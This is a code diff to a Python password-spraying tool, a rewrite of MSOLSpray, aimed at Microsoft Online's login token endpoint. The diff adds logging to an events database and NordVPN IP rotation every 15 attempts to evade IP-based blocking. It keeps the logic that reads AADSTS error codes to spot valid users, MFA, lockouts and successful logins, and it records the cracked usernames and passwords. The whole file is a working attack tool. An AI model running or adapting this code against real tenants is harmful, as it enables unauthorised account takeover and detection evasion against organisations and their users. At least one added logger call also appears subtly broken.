@@ -1,9 +1,10 @@
 import requests
 import argparse
 import time
-import os
-from nordvpn_switcher import initialize_VPN,rotate_VPN,terminate_VPN
 import datetime
+import sys
+from nordvpn_switcher import initialize_VPN,terminate_VPN
+from utils import configure_logger, safe_rotate_vpn, get_public_ip, init_db, log_event
 
 description = """
 This is a pure Python rewrite of dafthack's MSOLSpray (https://github.com/dafthack/MSOLSpray/) which is written in PowerShell. All credit goes to him!
@@ -23,10 +24,9 @@ parser = argparse.ArgumentParser(description=description, epilog=epilog, formatt
 
 parser.add_argument("-u", "--userlist", metavar="FILE", required=True, help="File filled with usernames one-per-line in the format 'user@domain.com'. (Required)")
 parser.add_argument("-p", "--password", required=True, help="A single password that will be used to perform the password spray. (Required)")
-parser.add_argument("-o", "--out", metavar="OUTFILE", help="A file to output results to.")
 parser.add_argument("-f", "--force", action='store_true', help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
 parser.add_argument("--url", default="https://login.microsoft.com", help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
-parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password")
+parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password", default=False)
 parser.add_argument("-s", "--sleep", default=0, type=int, help="Sleep this many seconds between tries")
 parser.add_argument("--vpn", action=argparse.BooleanOptionalAction, help="Use nord vpn to rotate IP")
 parser.add_argument("--userAsPass", action=argparse.BooleanOptionalAction, help="Use username as password")
@@ -36,7 +36,6 @@ args = parser.parse_args()
 password = args.password
 url = args.url
 force = args.force
-out = args.out
 verbose = args.verbose
 sleep = args.sleep
 vpn = args.vpn
@@ -48,30 +47,50 @@ with open(args.userlist, "r") as userlist:
 
 username_count = len(usernames)
 
-print(f"There are {username_count} users in total to spray,")
-print("Now spraying Microsoft Online.")
-print(f"Current date and time: {time.ctime()}")
+global LOGGER
+LOGGER = configure_logger(args.verbose, "MSOL")
+init_db("events.db")
+LOGGER.info(f"There are {username_count} users in total to spray,")
+LOGGER.info("Now spraying Microsoft Online.")
+LOGGER.info(f"Current date and time: {time.ctime()}")
 
-results = ""
 username_counter = 0
 lockout_counter = 0
 lockout_question = False
-unknownUsers = []
-logfile = open('logfile.txt','a')
+
 if vpn:
-    initialize_VPN(save=1,area_input=['Europe'])
+        try:
+            initialize_VPN(save=1, area_input=['France,Germany,Netherlands,United Kingdom'])
+        except Exception as e:
+            LOGGER.warning(f"[VPN] initialize_VPN failed at start: {e}")
+
+        # --- NEW: capture initial IP and exit if unavailable ---
+        prev_ip = get_public_ip(timeout=5, retries=2)
+        if not prev_ip:
+            LOGGER.critical("[VPN] Could not determine initial public IP after VPN init. Exiting.")
+            try:
+                terminate_VPN()
+            except Exception as e:
+                LOGGER.warning(f"[VPN] terminate_VPN failed while exiting: {e}")
+            sys.exit(1)
+        else:
+            LOGGER.info(f"[VPN] Initial public IP: {prev_ip}")
 
 for username in usernames:
-
     if username_counter>0 and sleep>0:        
         time.sleep(sleep)
     
     if vpn and username_counter%15==0:
-        rotate_VPN()
-        ip = requests.get("https://ifconfig.me").content.decode('utf-8')
+        new_ip = safe_rotate_vpn(prev_ip=prev_ip, rotate_retries=4)
+        if new_ip:
+            prev_ip = new_ip
+            LOGGER.debug(f"[VPN] Using IP {prev_ip}")
+        else:
+            LOGGER.warning("[VPN] Rotation failed — exiting")
+            sys.exit(1)
 
     username_counter += 1
-    print(f"{username_counter} of {username_count} users tested", end="\r")
+    LOGGER.info(f"{username_counter} of {username_count} users tested", end="\r")
 
     if userAsPass:
         body = {
@@ -101,71 +120,66 @@ for username in usernames:
 
     r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)
     time_posted = datetime.datetime.now()
-    try:
-        log = f"{time_posted},{ip},{username},{password}\n"
-        logfile.write(log)
-    except:
-        pass
+    ip = get_public_ip(timeout=5, retries=2)
+
     if r.status_code == 200:
-        print(f"SUCCESS! {username} : {password}")
-        results += f"{username} : {password}\n"
+        LOGGER.info(f"SUCCESS! {username} : {password}")
+        log_event(subject=username, target="https://graph.windows.net", status="success",  ip=ip, details="")
     else:
         resp = r.json()
         error = resp["error_description"]
 
         if "AADSTS50126" in error:
             if verbose:
-                print(f"VERBOSE: Invalid username or password. Username: {username} could exist.")
-                unknownUsers.append(username)
-                results += f"Error : {username} : {password}\n"
-            continue
+                LOGGER.error(f"VERBOSE: Invalid username or password. Username: {username} could exist.")
+                log_event(subject=username, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50126")
 
         elif "AADSTS50128" in error or "AADSTS50059" in error:
-            print(f"WARNING! Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.")
-            results += f"Error : {username} : {password}\n"
-
+            LOGGER.error(f"WARNING! Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.")
+            log_event(subject=username, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50128")
+            
         elif "AADSTS50034" in error:
-            print(f"WARNING! The user {username} doesn't exist.")
-            unknownUsers.append(username)            
-            results += f"Error : {username} : {password}\n"
-
+            LOGGER.error(f"WARNING! The user {username} doesn't exist.")
+            log_event(subject=username, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50034")
+                        
         elif "AADSTS50079" in error or "AADSTS50076" in error:
             # Microsoft MFA response
-            print(f"SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.")
-            results += f"Success : {username} : {password}\n"
-
+            LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.")
+            log_event(subject=username, target="https://graph.windows.net", status="success",  ip=ip, details="The response indicates MFA (Microsoft) is in use.")
+            
         elif "AADSTS50158" in error:
             # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
-            print(f"SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
-            results += f"Success : {username} : {password}\n"
-
+            LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
+            log_event(subject=username, target="https://graph.windows.net", status="success",  ip=ip, details="The response indicates conditional access (MFA: DUO or other) is in use.")
+            
         elif "AADSTS50053" in error:
             # Locked out account or Smart Lockout in place
-            print(f"WARNING! The account {username} appears to be locked.")
+            LOGGER.error(f"WARNING! The account {username} appears to be locked.")
+            log_event(subject=username, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50053")
             lockout_counter += 1
-            results += f"Error : {username} : {password}\n"
-
+            
         elif "AADSTS50057" in error:
             # Disabled account
-            print(f"WARNING! The account {username} appears to be disabled.")
-            results += f"Error : {username} : {password}\n"
-
+            LOGGER.error(f"WARNING! The account {username} appears to be disabled.")
+            log_event(subject=username, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50057")
+            
         elif "AADSTS50055" in error:
             # User password is expired
-            print(f"SUCCESS! {username} : {password} - NOTE: The user's password is expired.")
-            results += f"Success : {username} : {password}\n"
-
+            LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The user's password is expired.")
+            log_event(subject=username, target="https://graph.windows.net", status="success",  ip=ip, details="AADSTS50055")
+            
         else:
             # Unknown errors
-            print(f"Got an error we haven't seen yet for user {username}")
-            print(error)
-            results += f"Error : {username} : {password}\n"
+            LOGGER.error(f"Got an error we haven't seen yet for user {username}")
+            log_event(subject=username, target="https://graph.windows.net", status="fail",  ip=ip, details="Got an error we haven't seen yet for user.")
+            LOGGER.error(error)
+            
 
 
     # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
     if not force and lockout_counter == 10 and lockout_question == False:
-        print("WARNING! Multiple Account Lockouts Detected!")
-        print("10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?")
+        LOGGER.error("WARNING! Multiple Account Lockouts Detected!")
+        LOGGER.info("10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?")
         yes = {'yes', 'y'}
         no = {'no', 'n', ''}
         lockout_question = True
@@ -174,23 +188,11 @@ for username in usernames:
             choice = input("[Y/N] (default is N): ").lower()
 
         if choice in no:
-            print("Cancelling the password spray.")
-            print("NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled.")
+            LOGGER.info("Cancelling the password spray.")
+            LOGGER.info("NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled.")
             break
 
         # else: continue even though lockout is detected
 
-if out and results != "":
-    with open(out, 'a') as out_file:
-        out_file.write(results)
-        print(f"Results have been written to {out}.")
-
 if vpn:
     terminate_VPN()
-
-updatedFilename = f"{args.userlist}-Updated"
-print(f"Creating a new file {updatedFilename} by removing users that don't exist")
-with open(updatedFilename, "w") as updatedFile:
-    for username in usernames:
-        if username not in unknownUsers:
-            updatedFile.write(f'{username}\n')
